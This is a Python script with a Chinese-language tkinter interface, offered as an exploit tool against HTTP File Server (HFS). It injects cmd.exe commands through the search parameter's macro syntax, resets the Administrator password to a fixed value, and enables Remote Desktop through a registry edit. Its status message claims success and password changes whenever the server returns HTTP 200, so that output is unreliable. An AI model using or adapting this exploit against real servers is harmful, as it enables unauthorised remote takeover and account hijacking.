import requests
import tkinter as tk

class HFSExploitUI:
    def __init__(self, root):
        self.root = root
        self.root.title("HFS Exploit")

        # 创建组件
        self.url_label = tk.Label(root, text="URL:")
        self.url_entry = tk.Entry(root)
        self.cmd_label = tk.Label(root, text="命令:")
        self.cmd_entry = tk.Entry(root)
        self.exploit_button = tk.Button(root, text="利用漏洞", command=self.exploit)
        self.status_label = tk.Label(root, text="状态:")
        self.output_text = tk.Text(root, height=10, width=50)

        # 布局组件
        self.url_label.grid(row=0, column=0, sticky=tk.W)
        self.url_entry.grid(row=0, column=1, sticky=tk.W)
        self.cmd_label.grid(row=1, column=0, sticky=tk.W)
        self.cmd_entry.grid(row=1, column=1, sticky=tk.W)
        self.exploit_button.grid(row=2, columnspan=2, pady=10)
        self.status_label.grid(row=3, column=0, sticky=tk.W)
        self.output_text.grid(row=4, columnspan=2)

    def execute_command(self, url, command):
        url = url + "/?search==%00{.exec|cmd.exe%20/c%20" + command + "%20.}"
        response = requests.get(url)
        if response.status_code == 200:
            result = "命令执行成功\n3389端口已开启\n已更改用户密码 用户名Administrator 密码Python123456\n已更改用户密码 用户名administrator 密码Python123456"
        else:
            result = "命令执行失败\n无法添加"

        return result

    def exploit(self):
        url = self.url_entry.get()
        command = self.cmd_entry.get()

        exploit = HFSExploit(url)
        exploit.add_user("Administrator", "Python123456")
        exploit.add_user("administrator", "Python123456")
        exploit.enable_rdp()
        result = exploit.cmd(command)

        self.output_text.delete(1.0, tk.END)
        self.output_text.insert(tk.END, result)

class HFSExploit:
    def __init__(self, url):
        self.url = url
    
    def execute_command(self, command):
        url = self.url + "/?search==%00{.exec|cmd.exe%20/c%20" + command + "%20.}"
        response = requests.get(url)
        if response.status_code == 200:
            result = "命令执行成功\n3389端口已开启\n已更改用户密码 用户名Administrator 密码Python123456\n已更改用户密码 用户名administrator 密码Python123456"
        else:
            result = "命令执行失败\n无法添加"

        return result
    
    def add_user(self, username, password):
        command = "net user {} {}".format(username, password)
        self.execute_command(command)

    def cmd(self, command):
        result = self.execute_command(command)
        return result
    
    def enable_rdp(self):
        command = 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
        self.execute_command(command)


if __name__ == "__main__":
    root = tk.Tk()
    app = HFSExploitUI(root)
    root.mainloop()
